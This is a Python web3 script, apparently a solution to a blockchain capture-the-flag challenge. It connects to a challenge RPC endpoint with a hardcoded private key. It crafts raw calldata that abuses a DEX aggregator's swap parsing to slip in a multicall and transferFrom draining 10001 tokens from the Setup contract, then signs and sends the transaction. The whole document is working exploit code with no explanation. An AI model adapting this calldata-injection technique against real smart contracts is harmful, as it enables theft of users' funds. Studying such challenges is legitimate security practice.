from web3 import Web3

RPC_URL = "http://challenge.cnsc.com.vn:32313/704426a6-5629-430a-8dab-19a4b2ae30e5"
PRIV_KEY = "a15df1ebd0ccde436b748438d6e6bdadcf18a6beb91a2e8e5f1d4ba87de8e017"
SETUP_ADDR = "0x86E4582999D68c1d7582896F1cd70f454Eb5A590"

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIV_KEY)
player = account.address
print(f"Player: {player}")

setup_abi = [
    {"inputs":[],"name":"aggregator","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"coin","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"}
]
setup = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)
aggregator_addr = setup.functions.aggregator().call()
coin_addr = setup.functions.coin().call()
print(f"Coin: {coin_addr}")

transfer_data = bytes.fromhex("23b872dd") + \
                bytes.fromhex(SETUP_ADDR[2:].rjust(64, '0')) + \
                bytes.fromhex(coin_addr[2:].rjust(64, '0')) + \
                (10001 * 10**18).to_bytes(32, 'big')

mc_data = bytes.fromhex("ac9650d8") + \
          (32).to_bytes(32, 'big') + \
          (1).to_bytes(32, 'big') + \
          (32).to_bytes(32, 'big') + \
          len(transfer_data).to_bytes(32, 'big') + \
          transfer_data

if len(mc_data) % 32 != 0:
    mc_data += b'\x00' * (32 - (len(mc_data) % 32))

coin_target_fmt = bytes.fromhex(coin_addr[2:]) + b'\x00' * 12

REL_TARGET_PAYLOAD = 100
ABS_TARGET_PAYLOAD = 68 + REL_TARGET_PAYLOAD

REL_MC_PAYLOAD = 100 + 32
ABS_MC_PAYLOAD = 68 + REL_MC_PAYLOAD

len_mc = len(mc_data)
REL_SEQ_START = REL_MC_PAYLOAD + len_mc
ABS_SEQ_START = 68 + REL_SEQ_START

len_seq = 5
REL_CMD_START = REL_SEQ_START + len_seq

modifier = REL_CMD_START - 2
print(f"Calculated Modifier: {modifier}")

data = bytearray()
data += modifier.to_bytes(2, 'big') + b'\x00\x00'
data += b'\x00' * 60 + b'\x00\x00\x44\x00' + b'\xff' * 32 

data += coin_target_fmt
data += mc_data

data += b'\x04' + ABS_MC_PAYLOAD.to_bytes(2, 'big') + len_mc.to_bytes(2, 'big')

data += b'\x00' + b'\x00\x00' + \
        ABS_SEQ_START.to_bytes(2, 'big') + \
        (ABS_SEQ_START + len_seq).to_bytes(2, 'big') + \
        ABS_TARGET_PAYLOAD.to_bytes(2, 'big')

print("Sending final exploit...")
agg_contract = w3.eth.contract(address=aggregator_addr, abi=[{'inputs': [{'internalType': 'bytes', 'name': '', 'type': 'bytes'}], 'name': 'swap', 'outputs': [{'internalType': 'uint256', 'name': 'amountOut', 'type': 'uint256'}], 'stateMutability': 'nonpayable', 'type': 'function'}])

tx_params = {'from': player, 'nonce': w3.eth.get_transaction_count(player), 'gas': 5000000, 'gasPrice': w3.to_wei('20', 'gwei')}

try:
    agg_contract.functions.swap(data).call(tx_params)
    print("[SIMULATION] Success! Sending transaction...")
except Exception as e:
    print(f"[SIMULATION] Failed: {e}")

tx = agg_contract.functions.swap(data).build_transaction(tx_params)
signed = w3.eth.account.sign_transaction(tx, PRIV_KEY)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print(f"Tx Hash: {tx_hash.hex()}")

rec = w3.eth.wait_for_transaction_receipt(tx_hash)
if rec.status == 1:
    print("\n[SUCCESS] Exploit executed successfully!")
    print("Go to netcat -> option 3 -> get flag!")
else:
    print("\n[FAILED] Transaction reverted.")